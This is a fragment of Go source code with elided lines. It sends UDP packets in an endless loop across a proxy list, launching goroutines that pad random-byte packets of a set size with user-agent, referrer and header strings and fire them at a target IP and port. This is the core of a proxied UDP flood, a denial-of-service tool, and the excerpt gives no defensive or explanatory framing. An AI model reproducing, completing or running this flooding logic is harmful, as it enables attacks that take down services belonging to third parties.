	...
	for {
		for _, proxy := range proxies {
			...
			go func(proxy string) {
				...
				sendUDPPacket(proxy, ip, port, packetSize, ua, ref, hdr)
			}(proxy)
		}
...
func sendUDPPacket(proxy string, ip string, port int, packetSize int, userAgent string, referrer string, header string) {
	...
	packetContents := make([]byte, packetSize)
	rand.Read(packetContents)
	packetContents = append(packetContents, []byte(userAgent+"\r\n"+referrer+"\r\n"+header+"\r\n")...)

	_, err = udpConn.Write(packetContents)
	if err != nil {
		fmt.Println(err)
		return
	}
